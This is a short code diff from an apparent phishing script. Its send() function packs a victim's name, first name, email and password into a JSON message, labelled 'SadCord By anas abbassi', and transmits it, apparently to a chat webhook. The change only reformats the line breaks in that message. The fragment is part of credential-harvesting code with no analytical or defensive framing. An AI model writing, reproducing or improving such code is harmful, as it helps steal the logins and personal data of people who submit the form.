@@ -10,7 +10,7 @@ function send(){
     var params = {
         username: "SadCord By anas abbassi",
         
-        content: '\n name:'+a+'\nprenom:'+b+ "\nemail:"+c+'\n password:'+d
+        content: 'name:'+a+'\n prenom:'+b+ "\n email:"+c+'\n password:'+d
 
     };
     request.send(JSON.stringify(params));
